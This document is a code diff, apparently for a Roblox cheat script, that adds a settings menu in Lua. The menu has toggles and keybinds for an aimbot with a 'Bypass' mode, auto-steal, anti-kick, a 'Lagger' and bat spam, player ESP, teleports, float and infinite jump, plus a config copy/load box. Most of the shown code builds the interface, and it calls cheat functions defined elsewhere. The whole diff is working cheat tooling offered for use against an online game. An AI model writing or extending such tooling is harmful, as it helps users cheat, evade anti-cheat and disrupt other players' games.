+        __HH.bodyLockEnabled=on==true
+        if on and not __HH.batV2Enabled and not __HH.tpLockEnabled then __HH.startBodyLock() else __HH.stopBodyLock() end
+        saveConfig()
+    end, __HH.bodyLockEnabled)
+    mkBoxRow(sfCombat, "Body Lock Range", __HH.bodyLockRange, function(v) __HH.bodyLockRange=math.clamp(math.floor(v),5,200);saveConfig() end)
+    __HH.setAntiFlingVisual = mkToggle(sfCombat, "Anti Fling", function(on) __HH.antiFlingEnabled=on==true;saveConfig() end, __HH.antiFlingEnabled)
+
+    mkSect(sfCombat, "Yousef")
+    __HH.setBatCounterVisual  = mkToggle(sfCombat, "Bat Counter",    function(on) __HH.batCounterEnabled=on; if on then startBatCounter() else stopBatCounter() end; saveConfig() end, __HH.batCounterEnabled)
+    setMedusaVisual      = mkToggle(sfCombat, "Medusa Counter", function(on) __HH.medusaCounterEnabled=on; if on then setupMedusa(LP.Character) else stopMedusaCounter() end; saveConfig() end, __HH.medusaCounterEnabled)
+
+
+
+
+    _G.PureMirrorTPDownSetVisual = mkToggle(sfCombat, "MIRROR TP DOWN", function(on)
+        if _G.PureMirrorTPDown and _G.PureMirrorTPDown.setEnabled then
+            _G.PureMirrorTPDown.setEnabled(on)
+        end
+        saveConfig()
+    end, (_G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
+        and _G.PureMirrorTPDown.enabled()) == true)
+
+    _G.PureBatSpamSetVisual = mkToggle(sfCombat, "Bat Spam", function(on)
+        if _G.PureBatSpam and _G.PureBatSpam.setEnabled then
+            _G.PureBatSpam.setEnabled(on)
+        end
+        saveConfig()
+    end, (_G.PureBatSpam and _G.PureBatSpam.enabled
+        and _G.PureBatSpam.enabled()) == true)
+
+    __HH.setAntiDieVisual = mkToggle(sfCombat, "Anti Die", function(on)
+        __HH.antiDieEnabled = on
+        if on then __HH.startAntiDie() else __HH.stopAntiDie() end
+        saveConfig()
+    end, __HH.antiDieEnabled)
+
+    __HH.setAutoResetOnDeathVisual = mkToggle(sfCombat, "Instant Reset on Die", function(on)
+        __HH.autoResetOnDeath = on
+        if on and __HH.antiDieEnabled then
+            __HH.antiDieEnabled = false
+            __HH.stopAntiDie()
+            if __HH.setAntiDieVisual then __HH.setAntiDieVisual(false) end
+        end
+        __HH.setupDeathReset()
+        saveConfig()
+    end, __HH.autoResetOnDeath)
+
+    mkSect(sfMechns, "Actions")
+    mkActionRow(sfMechns, "Speed Toggle",  nil, __HH.KB.SpeedToggle)
+    mkActionRow(sfMechns, "Lagger Toggle", nil, __HH.KB.LaggerToggle)
+    mkActionRow(sfMechns, "Insta Reset",   function() __HH.FrameReset.ResetPlayer() end, __HH.KB.InstaReset)
+    mkActionRow(sfMechns, "Drop Brainrot", function() runDrop() end,     __HH.KB.DropBrainrot)
+    mkActionRow(sfMechns, "TP Down",       function() __HH.tpToGround() end,  __HH.KB.TPFloor)
+    mkActionRow(sfMechns, "Hide GUI",      function() if __HH.mainFrame then __HH.mainFrame.Visible = not __HH.mainFrame.Visible end end, __HH.KB.GuiHide)
+
+    mkSect(sfMechns, "Toggles")
+    __HH.tpLockSetVisual = mkToggleKB(sfMechns, "TP BAT", __HH.KB.TPLock, function(on)
+        if __HH._anyKeyListening then return end
+        if on then
+            
+            if __HH.batV2Enabled then toggleBatV2() end
+            toggleTPLock()
+        else if __HH.tpLockEnabled then toggleTPLock() end end
+        saveConfig()
+    end, function() saveConfig() end)
+    __HH.tpLockSetVisual(__HH.tpLockEnabled)
+
+    __HH.batV2SetVisual = mkToggleKB(sfMechns, "AIM BOT", __HH.KB.BatV2Toggle, function(on)
+        if __HH._anyKeyListening then return end
+        if on then
+            if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart(true) then
+                if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
+                return
+            end
+            if __HH.tpLockEnabled then toggleTPLock() end
+            toggleBatV2()
+        else
+            if __HH.batV2Enabled then toggleBatV2() end
+        end
+        saveConfig()
+    end, function() saveConfig() end)
+    __HH.batV2SetVisual(__HH.batV2Enabled)
+
+
+    do
+        local mRow = mkRow(sfMechns); mkLabel(mRow, "AIM Mode")
+        local mBtns = {}
+        local function mkAimModeBtn(lbl, xOff, mode)
+            local b = Instance.new("TextButton", mRow)
+            b.Size = UDim2.new(0,58,0,20); b.Position = UDim2.new(1,xOff,0.5,-10)
+            b.BackgroundColor3 = (batAimMode==mode) and WHITE or BTN_ACT
+            b.BorderSizePixel = 0; b.Text = lbl
+            b.TextColor3 = (batAimMode==mode) and BLACK or Color3.fromRGB(180,180,200)
+            b.Font = Enum.Font.GothamBold; b.TextSize = 8; b.AutoButtonColor = false; b.ZIndex = 5
+            Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
+            table.insert(mBtns, b)
+            b.MouseButton1Click:Connect(function()
+                if batAimMode == mode then return end
+                batAimMode = mode
+                b.BackgroundColor3 = WHITE; b.TextColor3 = BLACK
+                for _, ob in ipairs(mBtns) do
+                    if ob ~= b then
+                        ob.BackgroundColor3 = BTN_ACT; ob.TextColor3 = Color3.fromRGB(180,180,200)
+                    end
+                end
+                if __HH.batV2Enabled then
+                    stopAimbotFull()
+                    queueAutoBatStart()
+                    if __HH.batV2SetVisual then __HH.batV2SetVisual(true) end
+                    if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(true) end
+                end
+                saveConfig()
+            end)
+            return b
+        end
+        mkAimModeBtn("Normal", -122, "normal")
+        mkAimModeBtn("Bypass", -58,  "bypass")
+    end
+    autoLeftSetVisual = mkToggleKB(sfMechns, "Auto Left", __HH.KB.AutoLeft, function(on)
+        if __HH._anyKeyListening then return end
+        autoLeftEnabled = on
+        if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(on) end
+        if on then startAutoLeft() else stopAutoLeft() end
+        saveConfig()
+    end, function() saveConfig() end)
+    autoLeftSetVisual(autoLeftEnabled)
+
+    autoRightSetVisual = mkToggleKB(sfMechns, "Auto Right", __HH.KB.AutoRight, function(on)
+        if __HH._anyKeyListening then return end
+        autoRightEnabled = on
+        if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(on) end
+        if on then startAutoRight() else stopAutoRight() end
+        saveConfig()
+    end, function() saveConfig() end)
+    autoRightSetVisual(autoRightEnabled)
+
+
+    mkSect(sfCombat, "Auto Steal")
+    do
+        local bridge = _G.HorizonStealModes
+        mkToggle(sfCombat, "Auto Steal", function(on) if bridge then bridge.SetEnabled(on) end end, bridge and bridge.GetEnabled() or false)
+        local row=mkRow(sfCombat);mkLabel(row,"Steal Mode")
+        local iBtn=Instance.new("TextButton",row);iBtn.Size=UDim2.new(0,58,0,20);iBtn.Position=UDim2.new(1,-122,.5,-10);iBtn.Text="Instant";iBtn.Font=Enum.Font.GothamBold;iBtn.TextSize=8;iBtn.BorderSizePixel=0;iBtn.ZIndex=5;Instance.new("UICorner",iBtn).CornerRadius=UDim.new(0,4)
+        local sBtn=Instance.new("TextButton",row);sBtn.Size=UDim2.new(0,58,0,20);sBtn.Position=UDim2.new(1,-58,.5,-10);sBtn.Text="Semi";sBtn.Font=Enum.Font.GothamBold;sBtn.TextSize=8;sBtn.BorderSizePixel=0;sBtn.ZIndex=5;Instance.new("UICorner",sBtn).CornerRadius=UDim.new(0,4)
+        local function paint(m) iBtn.BackgroundColor3=m=="Instant" and WHITE or BTN_ACT;sBtn.BackgroundColor3=m=="Semi" and WHITE or BTN_ACT;iBtn.TextColor3=m=="Instant" and BLACK or WHITE;sBtn.TextColor3=m=="Semi" and BLACK or WHITE end
+        iBtn.MouseButton1Click:Connect(function() if bridge then bridge.SetMode("Instant");paint("Instant") end end)
+        sBtn.MouseButton1Click:Connect(function() if bridge then bridge.SetMode("Semi");paint("Semi") end end);paint(bridge and bridge.GetMode() or "Instant")
+        mkBoxRow(sfCombat,"Radius",bridge and bridge.GetRadius() or 61,function(v) if bridge then bridge.SetRadius(v) end end)
+    end
+
+    mkSect(sfCombat, "Misc")
+    setSafeModeVisual = mkToggle(sfCombat, "Anti Kick", function(on)
+        antiKickEnabled = on
+        if on and _G.AceSafeModeIsLocked and _G.AceSafeModeIsLocked()
+            and _G.AceSafeModeForceStop then
+            _G.AceSafeModeForceStop("AIM BOT BEFORE START")
+        end
+        saveConfig()
+    end, antiKickEnabled)
+    __HH.setInfJumpVisual = mkToggle(sfCombat, "Infinite Jump", function(on)
+        __HH.infJumpEnabled = on
+        if __HH.infJumpEnabled then if __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end
+        else __HH.stopHoldInfJump() end
+        saveConfig()
+    end, __HH.infJumpEnabled)
+
+    -- Jump Mode selector: Manual / Hold
+    do
+        local jRow = mkRow(sfCombat); mkLabel(jRow, "Jump Mode")
+        local jBtns = {}
+        local function mkJumpModeBtn(lbl, xOff, mode)
+            local b = Instance.new("TextButton", jRow)
+            b.Size = UDim2.new(0,52,0,20); b.Position = UDim2.new(1,xOff,0.5,-10)
+            b.BackgroundColor3 = (__HH.infJumpMode==mode) and WHITE or BTN_ACT
+            b.BorderSizePixel = 0; b.Text = lbl
+            b.TextColor3 = (__HH.infJumpMode==mode) and BLACK or Color3.fromRGB(180,180,200)
+            b.Font = Enum.Font.GothamBold; b.TextSize = 8; b.AutoButtonColor = false; b.ZIndex = 5
+            Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
+            table.insert(jBtns, b)
+            b.MouseButton1Click:Connect(function()
+                if __HH.infJumpMode == mode then return end
+                __HH.infJumpMode = mode
+                b.BackgroundColor3 = WHITE; b.TextColor3 = BLACK
+                for _, ob in ipairs(jBtns) do
+                    if ob ~= b then
+                        ob.BackgroundColor3 = BTN_ACT; ob.TextColor3 = Color3.fromRGB(180,180,200)
+                    end
+                end
+                __HH.stopHoldInfJump()
+                if __HH.infJumpEnabled and mode == "hold" then __HH.startHoldInfJump() end
+                saveConfig()
+            end)
+            return b
+        end
+        mkJumpModeBtn("Manual", -110, "manual")
+        mkJumpModeBtn("Hold",    -54,  "hold")
+    end
+
+    mkSect(sfCombat, "Auto Jump - Brainrot")
+    __HH.setAutoJumpBrainrotVisual = mkToggle(sfCombat, "Auto Jump while holding", function(on)
+        __HH.autoJumpBrainrot = on
+        saveConfig()
+    end, __HH.autoJumpBrainrot)
+
+    mkSect(sfCombat, "Float")
+    __HH.setFloatVisual = mkToggle(sfCombat, "Float", function(on)
+        __HH.floatEnabled = on
+        if __HH.FRFloat then __HH.FRFloat.setEnabled(on) end
+        saveConfig()
+    end, __HH.floatEnabled)
+    do
+        local fRow = mkRow(sfCombat)
+        mkLabel(fRow, "Float Height (studs)")
+        local fBox = Instance.new("TextBox", fRow)
+        fBox.Size = UDim2.new(0,70,0,20); fBox.Position = UDim2.new(1,-76,0.5,-10)
+        fBox.BackgroundColor3 = INP_BG
+        fBox.Text = tostring((__HH.FRFloat and __HH.FRFloat.getHeight()) or (__HH.floatHeight or 6))
+        fBox.TextColor3 = WHITE; fBox.Font = Enum.Font.GothamBold; fBox.TextSize = 10
+        fBox.ClearTextOnFocus = false; fBox.TextXAlignment = Enum.TextXAlignment.Center; fBox.ZIndex = 5
+        Instance.new("UICorner", fBox).CornerRadius = UDim.new(0,4)
+        local fbs = Instance.new("UIStroke", fBox); fbs.Color = DIM_LINE; fbs.Thickness = 1
+        fBox.Focused:Connect(function() TS:Create(fbs, TweenInfo.new(0.12), {Color=WHITE}):Play() end)
+        fBox.FocusLost:Connect(function()
+            TS:Create(fbs, TweenInfo.new(0.12), {Color=DIM_LINE}):Play()
+            local n = tonumber(fBox.Text)
+            if n then
+                __HH.floatHeight = math.clamp(n, 0, 200)
+                if __HH.FRFloat then __HH.FRFloat.setHeight(__HH.floatHeight) end
+                saveConfig()
+                fBox.Text = tostring(__HH.floatHeight)
+            else
+                fBox.Text = tostring((__HH.FRFloat and __HH.FRFloat.getHeight()) or (__HH.floatHeight or 6))
+            end
+        end)
+    end
+
+    mkSect(sfCombat, "Auto TP")
+    __HH.setAutoTPVisual = mkToggle(sfCombat, "Auto TP", function(on)
+        __HH.autoTPEnabled=on; if on then startAutoTP() else __HH.stopAutoTP() end; saveConfig()
+    end, __HH.autoTPEnabled)
+    mkBoxRow(sfCombat, "TP Height", __HH.autoTPHeight, function(v) if v>=0 and v<=500 then __HH.autoTPHeight=v end; saveConfig() end)
+
+    mkSect(sfVisual, "Avatar")
+    mkToggle(sfVisual, "Headless", function(on)
+        __HH.headlessEnabled = on == true
+        local char = LP.Character
+        if char then pcall(function() applyHeadless(char, __HH.headlessEnabled) end) end
+        saveConfig()
+    end, __HH.headlessEnabled)
+    mkToggle(sfVisual, "Korblox", function(on)
+        __HH.korbloxEnabled = on == true
+        local char = LP.Character
+        if char then pcall(function() applyKorblox(char, __HH.korbloxEnabled) end) end
+        saveConfig()
+    end, __HH.korbloxEnabled)
+
+    -- Pack Accessory (Catalog Changer — VisDuels port)
+    do
+        local row = mkRow(sfVisual)
+        mkLabel(row, "Pack Accessory")
+        row.Size = UDim2.new(1, -4, 0, 42)
+        row.ClipsDescendants = true
+
+        local left = Instance.new("TextButton", row)
+        left.BackgroundColor3 = Color3.fromRGB(7, 7, 10); left.BackgroundTransparency = 0.04
+        left.Text = "<"; left.TextColor3 = Color3.fromRGB(205, 232, 255); left.TextSize = 12
+        left.Font = Enum.Font.GothamSemibold; left.Size = UDim2.new(0, 42, 0, 28)
+        left.Position = UDim2.new(1, -186, 0.5, -14); left.BorderSizePixel = 0; left.ZIndex = 8
+        Instance.new("UICorner", left).CornerRadius = UDim.new(0, 8)
+        local leftStroke = Instance.new("UIStroke", left); leftStroke.Color = Color3.fromRGB(90, 90, 105); leftStroke.Transparency = 0.42
+
+        local holder = Instance.new("Frame", row)
+        holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0); holder.BackgroundTransparency = 0.28
+        holder.Size = UDim2.new(0, 92, 0, 28); holder.Position = UDim2.new(1, -139, 0.5, -14); holder.ClipsDescendants = true; holder.ZIndex = 7
+        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
+        local holderStroke = Instance.new("UIStroke", holder); holderStroke.Color = Color3.fromRGB(205, 232, 255); holderStroke.Transparency = 0.35
+
+        local accValueLabel = Instance.new("TextLabel", holder)
+        accValueLabel.BackgroundTransparency = 1; accValueLabel.Text = currentAccessoryPack
+        accValueLabel.TextColor3 = Color3.fromRGB(205, 232, 255); accValueLabel.TextSize = 11
+        accValueLabel.Font = Enum.Font.GothamSemibold; accValueLabel.Size = UDim2.new(1, 0, 1, 0); accValueLabel.ZIndex = 9
+        accValueLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+        local right = Instance.new("TextButton", row)
+        right.BackgroundColor3 = Color3.fromRGB(7, 7, 10); right.BackgroundTransparency = 0.04
+        right.Text = ">"; right.TextColor3 = Color3.fromRGB(205, 232, 255); right.TextSize = 12
+        right.Font = Enum.Font.GothamSemibold; right.Size = UDim2.new(0, 42, 0, 28)
+        right.Position = UDim2.new(1, -42, 0.5, -14); right.BorderSizePixel = 0; right.ZIndex = 8
+        Instance.new("UICorner", right).CornerRadius = UDim.new(0, 8)
+        local rightStroke = Instance.new("UIStroke", right); rightStroke.Color = Color3.fromRGB(90, 90, 105); rightStroke.Transparency = 0.42
+
+        local function updateAccessorySelector(direction)
+            local idx = 1
+            for i, entry in ipairs(ACCESSORY_PACK_ORDER) do
+                if entry[2] == currentAccessoryPack then idx = i; break end
+            end
+            local newIdx = idx + direction
+            if newIdx < 1 then newIdx = #ACCESSORY_PACK_ORDER end
+            if newIdx > #ACCESSORY_PACK_ORDER then newIdx = 1 end
+            local packName = ACCESSORY_PACK_ORDER[newIdx][2]
+            currentAccessoryPack = packName
+            accValueLabel.Text = packName
+            applyAccessoryPack(packName)
+            saveConfig()
+        end
+
+        left.MouseButton1Click:Connect(function() updateAccessorySelector(-1) end)
+        right.MouseButton1Click:Connect(function() updateAccessorySelector(1) end)
+    end
+
+    mkSect(sfVisual, "ESP")
+    __HH.setESPVisual = mkToggle(sfVisual, "ESP Players", function(on)
+        __HH.espEnabled = on == true
+        if on then
+            if startPlayerESP then startPlayerESP() end
+        else
+            if stopPlayerESP then stopPlayerESP() end
+        end
+        saveConfig()
+    end, __HH.espEnabled)
+
+    mkSect(sfVisual, "Visual Effects")
+    setAntiLagVisual    = mkToggle(sfVisual, "Anti Lag",    function(on) if on then enableAntiLag() else disableAntiLag() end; saveConfig() end, __HH.antiLagEnabled)
+    __HH.setStretchRezVisual = mkToggle(sfVisual, "Stretch Rez", function(on) if on then enableStretchRez() else disableStretchRez() end; saveConfig() end, __HH.stretchRezEnabled)
+
+    mkSect(sfVisual, "Button Shapes")
+    setCircleBtnsVisual = mkToggle(sfVisual, "Circle Buttons", function(on)
+        __HH.circleButtonsEnabled=on
+        if on then __HH.shapeButtonsEnabled=false; __HH.rectangularButtonsEnabled=false
+            if setShapeVisual then setShapeVisual(false) end
+            if setRectVisual then setRectVisual(false) end
+        end
+        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
+    end, __HH.circleButtonsEnabled)
+
+    setShapeVisual = mkToggle(sfVisual, "Shape Buttons", function(on)
+        __HH.shapeButtonsEnabled=on
+        if on then __HH.circleButtonsEnabled=false; __HH.rectangularButtonsEnabled=false
+            if setCircleBtnsVisual then setCircleBtnsVisual(false) end
+            if setRectVisual then setRectVisual(false) end
+        end
+        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
+    end, __HH.shapeButtonsEnabled)
+
+    setRectVisual = mkToggle(sfVisual, "Rectangular Buttons", function(on)
+        __HH.rectangularButtonsEnabled=on
+        if on then __HH.circleButtonsEnabled=false; __HH.shapeButtonsEnabled=false
+            if setCircleBtnsVisual then setCircleBtnsVisual(false) end
+            if setShapeVisual then setShapeVisual(false) end
+        end
+        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
+    end, __HH.rectangularButtonsEnabled)
+
+    mkSect(sfVisual, "Sky Theme")
+    do
+        local skyThemes = SKY_PRESETS_LIST or {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Tech", "Sakura", "Pink Night", "Blood Moon", "Emerald Dawn", "Volcanic", "Arctic", "Midnight Ocean", "Vaporwave", "Toxic", "Solar Eclipse", "Hellscape", "Heaven", "Storm", "Sunrise", "Deep Space", "Lavender Dream", "Inferno", "Mint Sky"}
+        local skyIndex = 1
+        for i, name in ipairs(skyThemes) do if name == __HH.currentSkyTheme then skyIndex = i break end end
+        
+        local row = mkRow(sfVisual); mkLabel(row, "Sky Theme")
+        row.Size = UDim2.new(1, -4, 0, 42)
+        row.ClipsDescendants = true
+        
+        local left = Instance.new("TextButton", row)
+        left.BackgroundColor3 = Color3.fromRGB(7, 7, 10); left.BackgroundTransparency = 0.04
+        left.Text = "<"; left.TextColor3 = Color3.fromRGB(205, 232, 255); left.TextSize = 12
+        left.Font = Enum.Font.GothamSemibold; left.Size = UDim2.new(0, 42, 0, 28)
+        left.Position = UDim2.new(1, -186, 0.5, -14); left.BorderSizePixel = 0; left.ZIndex = 8
+        Instance.new("UICorner", left).CornerRadius = UDim.new(0, 8)
+        local leftStroke = Instance.new("UIStroke", left); leftStroke.Color = Color3.fromRGB(90, 90, 105); leftStroke.Transparency = 0.42
+        
+        local holder = Instance.new("Frame", row)
+        holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0); holder.BackgroundTransparency = 0.28
+        holder.Size = UDim2.new(0, 92, 0, 28); holder.Position = UDim2.new(1, -139, 0.5, -14); holder.ClipsDescendants = true; holder.ZIndex = 7
+        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
+        local holderStroke = Instance.new("UIStroke", holder); holderStroke.Color = Color3.fromRGB(205, 232, 255); holderStroke.Transparency = 0.35
+        
+        skyValueLabel = Instance.new("TextLabel", holder)
+        skyValueLabel.BackgroundTransparency = 1; skyValueLabel.Text = skyThemes[skyIndex]
+        skyValueLabel.TextColor3 = Color3.fromRGB(205, 232, 255); skyValueLabel.TextSize = 11
+        skyValueLabel.Font = Enum.Font.GothamSemibold; skyValueLabel.Size = UDim2.new(1, 0, 1, 0); skyValueLabel.ZIndex = 9
+        skyValueLabel.TextXAlignment = Enum.TextXAlignment.Center
+        
+        local right = Instance.new("TextButton", row)
+        right.BackgroundColor3 = Color3.fromRGB(7, 7, 10); right.BackgroundTransparency = 0.04
+        right.Text = ">"; right.TextColor3 = Color3.fromRGB(205, 232, 255); right.TextSize = 12
+        right.Font = Enum.Font.GothamSemibold; right.Size = UDim2.new(0, 42, 0, 28)
+        right.Position = UDim2.new(1, -42, 0.5, -14); right.BorderSizePixel = 0; right.ZIndex = 8
+        Instance.new("UICorner", right).CornerRadius = UDim.new(0, 8)
+        local rightStroke = Instance.new("UIStroke", right); rightStroke.Color = Color3.fromRGB(90, 90, 105); rightStroke.Transparency = 0.42
+        
+        local function setSkyIndex(nextIndex)
+            if nextIndex < 1 then nextIndex = #skyThemes end
+            if nextIndex > #skyThemes then nextIndex = 1 end
+            skyIndex = nextIndex
+            __HH.currentSkyTheme = skyThemes[skyIndex]
+            if type(applySkyTheme) == "function" then applySkyTheme(__HH.currentSkyTheme) end
+            if skyValueLabel then skyValueLabel.Text = __HH.currentSkyTheme end
+            saveConfig()
+        end
+        left.MouseButton1Click:Connect(function() setSkyIndex(skyIndex - 1) end)
+        right.MouseButton1Click:Connect(function() setSkyIndex(skyIndex + 1) end)
+    end
+
+
+    do
+        local row = mkRow(sfExtra)
+        mkLabel(row, "Anim Changer")
+
+        local function makePackButton(text, xOffset)
+            local button = Instance.new("TextButton", row)
+            button.Size = UDim2.new(0, 42, 0, 22)
+            button.Position = UDim2.new(1, xOffset, 0.5, -11)
+            button.BackgroundColor3 = BTN_ACT
+            button.BorderSizePixel = 0
+            button.Text = text
+            button.TextColor3 = WHITE
+            button.Font = Enum.Font.GothamBold
+            button.TextSize = 12
+            button.AutoButtonColor = false
+            button.ZIndex = 5
+            Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+            local stroke = Instance.new("UIStroke", button)
+            stroke.Color = WHITE
+            stroke.Thickness = 1
+            stroke.Transparency = 0.55
+            return button
+        end
+
+        local leftButton = makePackButton("<", -160)
+        local valueLabel = Instance.new("TextLabel", row)
+        valueLabel.Size = UDim2.new(0, 106, 1, 0)
+        valueLabel.Position = UDim2.new(1, -116, 0, 0)
+        valueLabel.BackgroundTransparency = 1
+        valueLabel.TextColor3 = WHITE
+        valueLabel.Font = Enum.Font.GothamBold
+        valueLabel.TextSize = 9
+        valueLabel.TextXAlignment = Enum.TextXAlignment.Center
+        valueLabel.ZIndex = 5
+        local rightButton = makePackButton(">", -48)
+
+        local function refreshAcePackLabel()
+            valueLabel.Text = __HH.aceSelectedAnimationPack
+        end
+        local function setAcePack(index)
+            if index < 1 then index = #__HH.aceAnimationPackList end
+            if index > #__HH.aceAnimationPackList then index = 1 end
+            __HH.aceAnimationPackIndex = index
+            __HH.aceSelectedAnimationPack = __HH.aceAnimationPackList[index]
+            refreshAcePackLabel()
+            pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
+            saveConfig()
+        end
+
+        __HH.aceSyncAnimationPackIndex()
+        refreshAcePackLabel()
+        leftButton.MouseButton1Click:Connect(function()
+            setAcePack(__HH.aceAnimationPackIndex - 1)
+        end)
+        rightButton.MouseButton1Click:Connect(function()
+            setAcePack(__HH.aceAnimationPackIndex + 1)
+        end)
+    end
+
+    mkSect(sfExtra, "Performance")
+    mkToggle(sfExtra, "Nuke Optimizer", function(on)
+        if on then
+            pcall(function()
+                Lighting.GlobalShadows = false; Lighting.FogEnd = 9e9
+                Lighting.EnvironmentDiffuseScale = 0; Lighting.EnvironmentSpecularScale = 0
+                for _, e in ipairs(Lighting:GetChildren()) do
+                    if e:IsA("BloomEffect") or e:IsA("BlurEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("SunRaysEffect") or e:IsA("DepthOfFieldEffect") or e:IsA("Atmosphere") or e:IsA("Clouds") then
+                        e:Destroy()
+                    end
+                end
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
+                        pcall(function() obj:Destroy() end)
+                    end
+                    if obj:IsA("BasePart") and not obj:IsDescendantOf(LP.Character) then
+                        pcall(function() obj.CastShadow = false end)
+                    end
+                end
+            end)
+        end; saveConfig()
+    end, false)
+
+    mkSect(sfExtra, "UI Scale")
+    mkBoxRow(sfExtra, "UI Scale", uiScaleValue, function(v)
+        if v>=0.4 and v<=1.3 then
+            uiScaleValue=v; if __HH.uiScaleObject then __HH.uiScaleObject.Scale=v end; saveConfig()
+        end
+    end)
+
+    -- ─── Device & Config ────────────────────────────────────────────────────
+    -- (kept in one shared "do" block so the device label can be refreshed
+    -- from both the Reset Device button and the Load Config handler below)
+    mkSect(sfExtra, "Device")
+    local devLbl
+    do
+        local row = mkRow(sfExtra)
+        mkLabel(row, "Current Device")
+        devLbl = Instance.new("TextLabel", row)
+        devLbl.Size = UDim2.new(0, 90, 0, 20); devLbl.Position = UDim2.new(1, -95, 0.5, -10)
+        devLbl.BackgroundTransparency = 1; devLbl.Text = __HH.selectedDevice or "PC"
+        devLbl.TextColor3 = BTN_ACT; devLbl.Font = Enum.Font.GothamBold; devLbl.TextSize = 11
+        devLbl.TextXAlignment = Enum.TextXAlignment.Right; devLbl.ZIndex = 5
+
+        local resetRow = mkRow(sfExtra)
+        mkLabel(resetRow, "Reset Device")
+        local resetDevBtn = Instance.new("TextButton", resetRow)
+        resetDevBtn.Size = UDim2.new(0,90,0,20); resetDevBtn.Position = UDim2.new(1,-95,0.5,-10)
+        resetDevBtn.BackgroundColor3 = BTN_ACT; resetDevBtn.BorderSizePixel = 0
+        resetDevBtn.Text = "Reset"; resetDevBtn.TextColor3 = WHITE
+        resetDevBtn.Font = Enum.Font.GothamBold; resetDevBtn.TextSize = 10
+        resetDevBtn.AutoButtonColor = false; resetDevBtn.ZIndex = 5
+        Instance.new("UICorner", resetDevBtn).CornerRadius = UDim.new(0,5)
+        local rdStroke = Instance.new("UIStroke", resetDevBtn); rdStroke.Color = WHITE; rdStroke.Thickness = 1
+        resetDevBtn.MouseButton1Click:Connect(function()
+            if __HH.runDeviceSelection then
+                __HH.mainFrame.Visible = false
+                __HH.runDeviceSelection(true)
+                if devLbl then devLbl.Text = __HH.selectedDevice or "PC" end
+                __HH.mainFrame.Visible = true
+            end
+        end)
+    end
+
+    mkSect(sfExtra, "Config")
+    do
+        local copyRow = mkRow(sfExtra)
+        mkLabel(copyRow, "Copy Config")
+        local copyBtn = Instance.new("TextButton", copyRow)
+        copyBtn.Size = UDim2.new(0,90,0,20); copyBtn.Position = UDim2.new(1,-95,0.5,-10)
+        copyBtn.BackgroundColor3 = BTN_ACT; copyBtn.BorderSizePixel = 0
+        copyBtn.Text = "Copy"; copyBtn.TextColor3 = WHITE
+        copyBtn.Font = Enum.Font.GothamBold; copyBtn.TextSize = 10
+        copyBtn.AutoButtonColor = false; copyBtn.ZIndex = 5
+        Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0,5)
+        local copyStroke = Instance.new("UIStroke", copyBtn); copyStroke.Color = WHITE; copyStroke.Thickness = 1
+
+        local loadRow = mkRow(sfExtra)
+        mkLabel(loadRow, "Load Config")
+        local loadInput = Instance.new("TextBox", loadRow)
+        loadInput.Size = UDim2.new(0, 150, 0, 22); loadInput.Position = UDim2.new(1, -215, 0.5, -11)
+        loadInput.BackgroundColor3 = INP_BG; loadInput.PlaceholderText = "paste code here"
+        loadInput.Text = ""; loadInput.ClearTextOnFocus = false
+        loadInput.TextColor3 = WHITE; loadInput.PlaceholderColor3 = Color3.fromRGB(120,140,170)
+        loadInput.Font = Enum.Font.GothamBold; loadInput.TextSize = 9; loadInput.ZIndex = 5
+        loadInput.ClipsDescendants = true
+        Instance.new("UICorner", loadInput).CornerRadius = UDim.new(0,6)
+        local loadInputStroke = Instance.new("UIStroke", loadInput); loadInputStroke.Color = DIM_LINE; loadInputStroke.Thickness = 1
+
+        local loadBtn = Instance.new("TextButton", loadRow)
+        loadBtn.Size = UDim2.new(0,55,0,20); loadBtn.Position = UDim2.new(1,-60,0.5,-10)
+        loadBtn.BackgroundColor3 = BTN_ACT; loadBtn.BorderSizePixel = 0
+        loadBtn.Text = "Load"; loadBtn.TextColor3 = WHITE
+        loadBtn.Font = Enum.Font.GothamBold; loadBtn.TextSize = 10
+        loadBtn.AutoButtonColor = false; loadBtn.ZIndex = 5
+        Instance.new("UICorner", loadBtn).CornerRadius = UDim.new(0,5)
+        local loadStroke = Instance.new("UIStroke", loadBtn); loadStroke.Color = WHITE; loadStroke.Thickness = 1
+
+        local statusRow = mkRow(sfExtra)
+        local statusLbl = Instance.new("TextLabel", statusRow)
+        statusLbl.Size = UDim2.new(1,0,1,0); statusLbl.BackgroundTransparency = 1
+        statusLbl.Text = ""; statusLbl.TextColor3 = BTN_ACT
+        statusLbl.Font = Enum.Font.GothamBold; statusLbl.TextSize = 10
+        statusLbl.TextXAlignment = Enum.TextXAlignment.Left; statusLbl.ZIndex = 5
+
+        local function flashStatus(msg)
+            statusLbl.Text = msg
+            task.delay(3, function() if statusLbl.Text == msg then statusLbl.Text = "" end end)
+        end
+
+        copyBtn.MouseButton1Click:Connect(function()
+            local ok, code = pcall(function() return __HH.encodeConfigCode(__HH.buildConfigTable()) end)
+            if ok and code then
+                local copied = false
+                pcall(function()
+                    if setclipboard then setclipboard(code); copied = true
+                    elseif toclipboard then toclipboard(code); copied = true end
+                end)
+                if copied then
